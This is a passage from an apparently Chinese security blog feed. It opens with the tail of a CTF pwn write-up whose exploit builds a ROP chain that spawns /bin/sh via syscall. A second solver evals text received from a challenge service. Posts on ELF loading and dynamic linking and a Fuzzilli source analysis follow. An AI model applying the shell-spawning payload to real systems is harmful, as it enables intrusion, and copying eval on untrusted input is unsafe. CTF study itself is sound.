pop_rdi + bin_sh_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rdx_rbx + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + syscall_addr<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;quit\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-111&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这个<code>-111</code>确实看了一下wp，一开始发送的是-1，一直不行。然后，最后一个recvuntil是不能删除的，我们本地调试的时候可以不加这个recvuntil，但是远程环境是，我们发送数据包，对方接收大概率相差无几，很有可能最后两个payload会叠加然后一起被处理，所以会出错。</p><h2 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h2><p>这题是简单的IO交互，处理字符。用eval就很快。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">41087</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;=&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;=&quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;!&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    expression = p.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;exp:&quot;</span>, expression)<br>    expression = expression.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    expression = expression.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;//&quot;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;exp_after:&quot;</span>, expression)<br>    ans = <span class="hljs-built_in">eval</span>(expression)<br>    ans = <span class="hljs-built_in">str</span>(ans).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ans:&quot;</span>, ans)<br>    p.sendline(ans)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>装载与动态链接</title>
    <link href="/2025/03/21/%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
    <url>/2025/03/21/%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文摘自《程序员的自我修养》</p></blockquote><h1 id="可执行文件的装载与进程"><a href="#可执行文件的装载与进程" class="headerlink" title="可执行文件的装载与进程"></a>可执行文件的装载与进程</h1><h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><blockquote><p><strong>程序和进程有什么区别</strong></p><p>程序是一个静态的概念，它就是一些预编译好的指令和数据集合的一个文件；进程则是一个动态的概念，它是程序运行时的一个过程，很多时候把动态库叫做运行时（Runtime）也有一定的含义。</p></blockquote><p>每个程序被运行起来以后，它将拥有自己独立的<strong>虚拟地址空间</strong> ，这个虚拟地址空间的大小由计算机的硬件平台决定，具体地说是由CPU的位数决定的。硬件决定了地址空间的最大理论上限，即硬件的寻址空间大小，比如32位的硬件平台决定了虚拟地址空间的地址为0到2^32^-1，即<code>0x00000000</code> ~ <code>0xFFFFFFFF</code>，也就是常说的4GB虚拟空间大小；而64位的硬件平台具有64位寻址能力，它的虚拟地址空间达到了2^64^字节，即<code>0x0000000000000000</code> ~ <code>0xFFFFFFFFFFFFFFFF</code>总共17179869184GB，这个寻址能力从现在来看，几乎是无限的。</p><p>从程序的角度来看，我们可以通过判断C语言程序中的指针所占的空间来计算虚拟地址空间的大小。一般来说，C语言指针大小的位数与虚拟空间的位数相同，如32位平台下的指针为32位，即4字节；64位平台下的指针为64位，即8字节。</p><p>那么32位平台下的4GB虚拟空间，我们的程序是否可以任意使用呢？很遗憾，不行。因为程序在运行的时候处于操作系统的监管下，操作系统为了达到监控程序运行等一系列目的，进程的虚拟空间都在操作系统的掌握之中。进程只能使用那些操作系统分配给进程的地址，如果访问未经允许的空间，那么操作系统就会捕获到这些访问，将进程的这种访问当作非法操作，强制结束进程。<strong>我们经常在Windows下碰到令人讨厌的“进程非法操作需要关闭”或Linux下的“Segmentation fault”<strong>很多时候是因为进程访问了</strong>未经允许的地址</strong>。</p><p>那么到底这4GB的进程虚拟地址空间是怎样的分配状态呢？首先以Linux操作系统作为例子，默认情况下，Linux操作系统将进程的虚拟地址空间做了如下图所示的分配。</p><img src="/2025/03/21/装载与动态链接/image-20250321134614509.png"  alt="image-20250321134614509" style="zoom: 50%;" /><p>整个4GB被划分成两部分，其中操作系统本身用去了一部分：从地址<code>0xC0000000</code>到<code>0xFFFFFFFF</code>，共1GB。剩下的从<code>0x00000000</code>地址开始到<code>0xBFFFFFFF</code>共3GB的空间都是留给进程使用的。那么从原则上来讲，进程最多可以使用3GB的虚拟空间，也就是说整个进程在执行的时候，所有的代码、数据包括通过C语言malloc()等方法申请的虚拟空间之和不可以超过3GB。</p><h3 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h3><blockquote><p>内存空间：物理内存空间，指的是计算机系统中实际存在的物理内存（RAM）的总量。它是CPU通过地址总线可以直接访问的内存范围。硬件实际存在的内存，由RAM芯片组成。大小由CPU<strong>的地址总线宽度决定</strong>。例如，32位地址总线：可寻址2^32^个内存位置即4GB，36位地址总线：可寻址2^36^个内存位置，即64GB。CPU可通过物理地址直接访问内存中的数据。</p><p>虚拟地址空间：虚拟地址空间是操作系统为每个进程提供的抽象内存空间。每个进程都认为自己独享整个内存空间，而实际上这些内存可能映射到物理内存或磁盘上的交换空间（如页面文件）。虚拟地址空间是操作系统为每个进程提供的逻辑内存试图，独立于物理内存。<strong>大小由CPU的位数决定</strong>。例如，32位CPU：每个进程的虚拟地址空间为4GB（2^32^），64位CPU：每个进程的虚拟地址空间为17179869184GB，不过通常为128TB</p></blockquote><p>32位地址线只能访问最多4GB物理内存。扩展至36位地址线之后，Intel修改了页映射的方式，使得新的映射方式可以访问到更多的物理内存。Intel把这个地址扩展方式叫做PAE。</p><p>扩展的物理地址空间，对于普通程序来说是感觉不到它的存在。因为这是操作系统做的事。在应用程序里，只有32位虚拟地址空间。那么应用程序该如何使用这些大于常规的内存空间呢？一个常见方法就是操作系统提供一个窗口映射的方法，把这些额外的内存映射到进程地址空间中来。应用程序可以根据需要来选择申请和映射，比如一个应用程序中<code>0x10000000</code> ~ <code>0x20000000</code>这一段256MB的虚拟地址空间用来做窗口，程序可以从高于4GB的物理空间中申请多个大小为256MB的物理空间，编号为A、B、C等，然后根据需要将这个窗口映射到不同的物理空间块，用到A时将<code>0x1000000</code>~&#96;0x20000000&#96;映射到A，用到B、C时再映射过去。在Windows下，这种访问内存的操作方式叫做（AWE）；而像Linux等UNIX类操作系统则采用mmap()系统调用来实现。</p><h2 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h2><p>程序执行时所需要的指令和数据必须在内存中才能够正常运行，最简单的办法就是将程序运行所需要的指令和数据全都装入内存，这样程序就可以顺利运行，这就是最简单的<strong>静态装入</strong>的办法。但是，很多情况下程序所需要的内存数量大于物理内存的数量，当内存的数量不够时，根本的解决办法就是添加内存。相对于磁盘来说，内存是昂贵且稀有的，这种情况自计算机磁盘诞生以来一直如此。所以要尽可能用少的内存运行更多的程序，尽可能有效地利用内存。后来，程序运行时是有局部性原理的，所以我们可以将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是<strong>动态装入</strong>的基本原理。</p><p>覆盖装入(Overlay)和页映射(Paging)是两种很典型的动态装载方法，它们所采用的思想都差不多，原则上都是利用了程序的局部性原理。动态装入的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</p><h2 id="从操作系统角度看可执行文件的装载"><a href="#从操作系统角度看可执行文件的装载" class="headerlink" title="从操作系统角度看可执行文件的装载"></a>从操作系统角度看可执行文件的装载</h2><h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><p>事实上，从操作系统的角度来看，一个进程最关键的特征是它拥有独立的虚拟地址空间，这使得它有别于其他进程。很多时候一个程序被执行同时都伴随着一个新的进程的创建，那么我们就来看看这种最通常的情形：创建一个进程，然后装载相应的可执行文件并且执行。在有虚拟存储的情况下， 上述过程最开始只需要做三件事情：</p><ul><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系</li><li>将CPU的指令寄存器设置成可执行文件的入口地址，启动运行</li></ul><p>**首先是创建虚拟地址空间。**虚拟空间由一组页映射函数将虚拟空间的各个页映射至相应的物理空间，那么创建一个虚拟空间实际上并不是创建空间而是创建映射函数所需要的相应的数据结构，在i386的Linux下，创建虚拟地址空间实际上只是分配一个页目录就可以了，甚至不设置页映射关系，这些映射关系等到后面程序发生页错误的时候再进行设置。</p><p>**读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系。**上面那一步的页映射关系函数是虚拟空间到物理空间的映射关系，这一步所做的是虚拟空间与可执行文件的映射关系。当程序执行发生页错误时，操作系统将从物理内存中分配一个物理页，然后将该“缺页”从磁盘中读取到内存中，再设置缺页的虚拟页和物理页的映射关系，这样程序才得以正常运行。但是很明显的一点是，当操作系统捕获到缺页错误时，它应当知道程序当前所需要的页在可执行文件中的哪一个位置。这就是虚拟空间与可执行文件之间的映射关系。</p><blockquote><p>由于可执行文件在装载时实际上是被映射的虚拟空间，所以可执行文件很多时候又被叫做<strong>映像文件（image）</strong>。</p></blockquote><p><strong>将CPU指令寄存器设置成可执行文件入口，启动运行。</strong> 第三步其实也是最简单的一步，操作系统通过设置CPU的指令寄存器将控制权转交给进程，由此进程开始执行。这一步看似简单，实际上在操作系统层面上比较复杂，它涉及内核堆栈和用户堆栈的切换、CPU运行权限的切换。不过从进程的角度看这一步可以简单地认为操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址。<strong>ELF文件头中保存有入口地址</strong></p><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>要解决空间浪费和更新困难这两个问题最简单的办法就是把程序的模块相互分割开来，形成独立的文件，而不再将它们静态地链接在一起。简单地讲，就是不对那些组成程序的目标文件进行链接，等到程序要运行时才进行链接。也就是说，把链接这个过程推迟到了运行时再进行，这就是动态链接的基本思想。</p><p>动态链接的基本思想是把程序按照模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形成一个完整的程序，而不是像静态链接一样把所有的程序模块都链接成一个单独的可执行文件。在Linux系统中，ELF动态链接文件被称为<strong>动态共享对象</strong>，简称共享对象，它们一般都是以”.so”为扩展名的一些文件；而在Windows系统中，动态链接文件被称为动态链接库，它们通常就是我们平时很常见的以”.dll”为扩展名的文件。</p><blockquote><p>从本质上讲，普通可执行程序和动态链接库中都包含指令和数据，这一点没有区别。在使用动态链接库的情况下，程序本身被分为了程序主要模块和动态链接库，但实际上它们都可以看作是整个程序的一个模块。</p></blockquote><p>在Linux中，常用的C语言库的运行库glibc，它的动态链接形式的版本保存在“&#x2F;lib”目录下， 文件名叫做”libc.so”。整个系统只保留一份C语言库的动态链接文件“libc.so”，而所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载的时候，系统的动态链接器会讲程序所需要的动态链接库装载到进程的地址空间，并且将程序中所有未决议的符号绑定到相应的动态链接库中，并进行重定位工作。</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>在动态链接下，程序模块之间包含了大量的函数引用，所以在程序执行之前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位，因此会减慢动态链接性能。如果一开始就把所有函数都链接好实际上是一种浪费。所以ELF采用一种叫做<strong>延迟绑定</strong>的做法，基本思想就是当<strong>函数第一次被用到时才进行绑定</strong>，如果没有用到则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。这样的做法可以大大加快程序的启动速度，特别有利于一些有大量函数引用和大量模块的程序。</p><p>ELF使用PLT（Procedure Linkage Table）的方法来实现，这种方法使用了一些很精巧的指令序列来完成。在开始详细介绍之前，我们先从动态链接器的角度设想一下：假设liba.so需要调用libc.so中的bar()函数，那么当liba.so中第一次调用bar()函数时，这时候就需要动态链接器中的某个函数来完成地址绑定工作，假设这个函数叫做lookup()，那么lookup()需要知道哪些必要的信息才能完成这个函数地址绑定工作呢？我想答案很明显，lookup()至少需要知道这个地址绑定发生在哪个模块，哪个函数？那么我们可以假设lookup的原型为<code>lookup(module, function)</code>，这两个参数的值在我们这个例子中分别为liba.so和bar()。在Glibc中，这里的lookup函数真正的名字叫<code>_dl_runtime_resolve()</code>。</p><p>当我们调用某个外部模块的函数时，如果按照通常的做法应该是通过GOT中相应的项进行间接跳转。PLT为了实现延迟绑定，在这个过程中又增加了一层间接跳转。调用函数并不直接通过GOT跳转，而是通过一个叫作PLT项的结构来进行跳转。每个外部函数在PLT中都有一个相应的项，比如bar()函数在PLT中的项的地址我们称之为bar@plt。让我们来看看bar@plt的实现：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">bar</span>@<span class="hljs-selector-tag">plt</span>:<br><span class="hljs-selector-tag">jmp</span> *(bar<span class="hljs-variable">@GOT</span>)<br><span class="hljs-selector-tag">push</span> <span class="hljs-selector-tag">n</span><br><span class="hljs-selector-tag">push</span> <span class="hljs-selector-tag">moduleID</span><br><span class="hljs-selector-tag">jump</span> <span class="hljs-selector-tag">_dl_rumtime_resolve</span><br></code></pre></td></tr></table></figure><p>bar@plt的第一条指令是一条通过GOT间接跳转的指令。bar@GOT表示GOT中保存bar()这个函数相应的项。如果链接器在初始化阶段已经初始化该项，并且将bar()的地址填入该项，那么这个跳转指令的结果就是我们所期望的，跳转到bar()，实现函数正确调用。但是为了实现延迟绑定，链接器在初始化阶段并没有将bar()的地址填入到该项，而是将上面代码中第二条指令”push n”的地址填入到bar@GOT中，这个步骤不需要查找任何符号，所以代价很低。很明显，第一条指令的效果是跳转到第二条指令，相当于没有进行任何操作。第二条指令将一个数字n压入堆栈中，这个数字是bar这个符号引用在重定位表”.rel.plt”中的下标。接着又是一条push指令将模块的ID压入到堆栈，然后跳转到<code>_dl_runtime_resolve</code>。这实际上就是在实现我们前面提到的lookup(module, function)这个函数的调用：先将所需要决议符号的下标压入堆栈，再将模块ID压入堆栈，然后调用动态链接器的<code>_dl_runtime_resolve</code>函数来完成符号解析和重定位工作。<code>_dl_runtime_resolve</code>在进行一系列工作以后将bar()真正地址填入到bar@GOT中。</p><p>一旦bar()这个函数被解析完毕，当我们再次调用bar@plt时，第一条jmp指令就能够跳转到真正的bar()函数中，bar()函数返回的时候会根据堆栈里面保存的EIP直接返回到调用者，而不会再继续执行bar@plt中第二条指令开始的那段代码，那段代码只会在符号未被解析时执行一次。</p><p>上面描述的是PLT的基本原理，PLT真正的实现要比它的结构稍微复杂一点。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzilli源码分析</title>
    <link href="/2025/03/13/Fuzzilli%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2025/03/13/Fuzzilli%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzilli源码分析"><a href="#Fuzzilli源码分析" class="headerlink" title="Fuzzilli源码分析"></a>Fuzzilli源码分析</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>分析与调试环境为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dog@dog:~/swift/usr/bin$ lldb --version<br>lldb version 17.0.0 (https://github.com/swiftlang/llvm-project.git revision 3a02857b159678d97e33f8c5032541c3ddd5f1f6)<br>Swift version 6.2-dev (LLVM 3a02857b159678d, Swift c91e29523420c00)<br></code></pre></td></tr></table></figure><p>使用swift编译Fuzzilli时，使用debug模式：<code>swift build -c debug</code>，这种情形下，才能对其进行调试。</p><blockquote><p>Vscode调试swift项目时会存在BUG，调试时无法获取变量的值，也无法获得任何有用信息。即鼠标悬停在变量时，出现<code>Unable to determine byte size</code>，解决方案：<a href="https://github.com/vadimcn/codelldb/wiki/Swift">Codelldb Debugging problems</a></p></blockquote><p>以下是使用vscode调试时的<code>launch.json</code>文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// Use IntelliSense to learn about possible attributes.</span><br>    <span class="hljs-comment">// Hover to view descriptions of existing attributes.</span><br>    <span class="hljs-comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lldb&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sourceLanguages&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;swift&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Debug swift-executable&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/.build/debug/FuzzilliCli&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;--profile=qjs&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Targets/QJS/quickjs/qjs&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-comment">// &quot;preLaunchTask&quot;: &quot;Build for debug&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Fuzzilli-工作原理"><a href="#Fuzzilli-工作原理" class="headerlink" title="Fuzzilli 工作原理"></a>Fuzzilli 工作原理</h2><p>Fuzzilli具有两个主要的模糊测试引擎：Mutation Engine和Hybrid Engine。后者本质上是纯生成组件与现有变异的结合。</p><p>在解释这些引擎的工作原理之前，首先解释FuzzIL，这是Fuzzilli构建的基础的自定义中间语言。</p><p>可以通过使用<code>--inspect</code>CLI标志来观察文档中描述的所有机制的实际运行情况。如果启用，所有写入磁盘的程序（本质上是语料库中的程序以及Crash）都将有一个额外的.history文件，描述程序的“历史记录”，即为生成程序而执行的确切变异、拼接、代码生成等步骤。</p><h3 id="Fuzzilli的目标"><a href="#Fuzzilli的目标" class="headerlink" title="Fuzzilli的目标"></a>Fuzzilli的目标</h3><p>除了生成”interesting”的JavaScript代码这个核心目标外，Fuzzilli还必须处理以下两个问题。</p><h4 id="语法正确性"><a href="#语法正确性" class="headerlink" title="语法正确性"></a>语法正确性</h4><p>如果一个程序在语法上无效，它将在引擎中被解析器在处理的早期阶段拒绝。 由于 Fuzzilli 不尝试查找语言解析器中的错误，因此这样的执行将有效地被浪费。 因此，Fuzzilli 致力于实现 100% 的句法正确率。 这是通过使用 FuzzIL（接下来讨论）来构建实现的，FuzzIL 只能表达在语法上有效的 JavaScript 代码。</p><h4 id="语义正确性"><a href="#语义正确性" class="headerlink" title="语义正确性"></a>语义正确性</h4><p>在 Fuzzilli 中，引发未捕获异常的程序被认为是语义上不正确的，或简称为无效。 虽然可以将每个（或大多数）语句包装到 try-catch 块中，但这将从根本上改变生成的程序的控制流，从而改变 JIT 编译器的优化方式。 许多 JIT 错误无法通过这样的程序触发。 因此，至关重要的是，Fuzzilli 生成具有相当高程度的语义有效的样本（作为基准，Fuzzilli 应以高于 50% 的正确率为目标）。</p><p>这个挑战取决于每个模糊测试引擎，因此将分别针对每个引擎进行讨论。</p><h3 id="FuzzIL-中间语言"><a href="#FuzzIL-中间语言" class="headerlink" title="FuzzIL 中间语言"></a>FuzzIL 中间语言</h3><p>源码位于：Sources&#x2F;Fuzzilli&#x2F;FuzzIL</p><p>Fuzzilli基于一种名为FuzzIL的自定义中间语言。FuzzIL的设计具有四个核心目标：</p><ul><li>促进有意义的代码变异</li><li>易于静态推理（参见关于类型系统的章节）</li><li>易于提升（lift）到JavaScript</li><li>确保生成的JavaScript代码的某些正确性属性，例如语法正确性以及在使用变量之前定义变量</li></ul><p>Fuzzilli 内部专门对 FuzzIL 程序进行操作，并且仅为了执行才将其提升到 JavaScript。 因此，使用 FuzzIL 的高级模糊测试管道如下所示：</p><img src="/2025/03/13/Fuzzilli%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20250313210907839.png" class="" title="image-20250313210907839"><p>提升由 <code>JavaScriptLifter</code> 执行，而 JavaScript 代码的执行通过 REPRL（读取-求值-打印-重置-循环）机制进行，这本质上是 JS 引擎的持久模糊测试的实现，它还提供有关执行是否成功的反馈（如果执行因未捕获的异常而终止，则执行失败）。</p><p>FuzzIL 程序可以序列化为 protobuf，这用于将它们存储到磁盘或在分布式模糊测试的情况下通过网络发送它们。 可以使用 <code>FuzzILTool</code> 将 protobuf 格式的 FuzzIL 程序转换为 JavaScript 或 FuzzIL 的文本表示形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swift run FuzzILTool --liftToFuzzIL path/to/program.protobuf<br></code></pre></td></tr></table></figure><p>FuzzIL 致力于实现大部分自解释性。 例如，一个假想的 FuzzIL 样本可能如下所示</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">v0 &lt;- BeginPlainFunctionDefinition -&gt; v1, v2, v3<br>    v4 &lt;- BinaryOperation v1 &#x27;+&#x27; v2<br>    SetProperty v3, &#x27;foo&#x27;, v4<br>EndPlainFunctionDefinition<br>v5 &lt;- LoadString <span class="hljs-string">&quot;Hello World&quot;</span><br>v6 &lt;- CreateObject [&#x27;bar&#x27;: v5]<br>v7 &lt;- LoadFloat 13.37<br>v8 &lt;- CallFunction v0, [v7, v7, v6]<br></code></pre></td></tr></table></figure><p>当内联中间表达式时，提升到 JavaScript 代码的同一个程序可能如下所示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f0</span>(<span class="hljs-params">a1, a2, a3</span>) &#123;<br>  a3.<span class="hljs-property">foo</span> = a1 + a2;<br>&#125;<br><span class="hljs-keyword">const</span> v6 = &#123; <span class="hljs-attr">bar</span>: <span class="hljs-string">&quot;Hello World&quot;</span> &#125;;<br><span class="hljs-title function_">f0</span>(<span class="hljs-number">13.37</span>, <span class="hljs-number">13.37</span>, v6);<br></code></pre></td></tr></table></figure><p>或者，当使用简单的提升算法时，可能如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f0</span>(<span class="hljs-params">a1, a2, a3</span>) &#123;<br>  <span class="hljs-keyword">const</span> v4 = a1 + a2;<br>  a3.<span class="hljs-property">foo</span> = v4;<br>&#125;<br><span class="hljs-keyword">const</span> v5 = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-keyword">const</span> v6 = &#123; <span class="hljs-attr">bar</span>: v5 &#125;;<br><span class="hljs-keyword">const</span> v7 = <span class="hljs-number">13.37</span>;<br><span class="hljs-keyword">const</span> v8 = <span class="hljs-title function_">f0</span>(v7, v7, v6);<br></code></pre></td></tr></table></figure><p>最终，使用的提升算法可能并不重要，因为无论代码的语法表示形式如何，JavaScript 引擎的字节码和 JIT 编译器都会产生几乎相同的结果。</p><p>FuzzIL 有一个“受保护”操作的概念，这些操作通过 try-catch 保护免受运行时异常的影响。 例如，如果 <code>CallFunction</code> 操作可能合理地引发异常（例如，因为参数类型不正确），则可以将其标记为受保护：<code>CallFunction v3, [v5, v6] (guarded)</code>。 在这种情况下，它将提升到如下所示的 JavaScript 代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title function_">v3</span>(v5, v6);<br>&#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>由于为受保护操作生成的 try-catch 块会对程序的行为产生负面影响（如上所述），因此应谨慎使用它们。 此外，Fuzzilli 尝试在 Minimization 期间以及通过 <code>FixupMutator</code> 将受保护操作转换为不受保护的操作，这两者将在本文档后面进一步讨论。</p><p>FuzzIL 具有许多属性：</p><ul><li>一个 FuzzIL 程序只是一个指令列表。</li><li>每个 FuzzIL 程序都可以提升为语法上有效的 JavaScript 代码。</li><li>一个 FuzzIL 指令是一个操作，以及输入和输出变量，并且可能有一个或多个参数（在上面的表示法中用单引号括起来）。</li><li>每个变量在使用之前都已定义，并且变量编号是递增且连续的。</li><li>控制流通过“块”来表达，这些块至少具有一个 <code>Begin</code> 和一个 <code>End</code> 操作，但也可能具有中间操作，例如 <code>BeginIf</code>、<code>BeginElse</code>、<code>EndIf</code>。</li><li>块指令可以具有内部输出（在上面的表示法中，<code>-&gt;</code> 后面的那些），这些输出仅在新打开的作用域中可见（例如函数参数）。</li><li>指令的输入始终是变量，没有立即值。</li><li>指令的每个输出都是一个新变量，并且只能通过专用操作（例如 <code>Reassign</code> 指令）来重新分配现有变量。</li></ul><h3 id="变异FuzzIL代码"><a href="#变异FuzzIL代码" class="headerlink" title="变异FuzzIL代码"></a>变异FuzzIL代码</h3><p>FuzzIL 旨在促进各种有意义的代码变异。 在本节中，将解释核心变异。</p><p>应该注意的是，Fuzzilli 中的程序是不可变的，这使得推理它们更容易。 因此，当一个程序被变异时，它实际上是在将变异应用到它的同时被复制。 这是通过 <code>ProgramBuilder</code> 类完成的，它是 Fuzzilli 中的一个核心组件，允许生成新指令或从另一个程序复制指令，并公开关于正在构建的程序的各种信息，例如哪些变量当前可见。</p><h4 id="Input-Mutator"><a href="#Input-Mutator" class="headerlink" title="Input Mutator"></a>Input 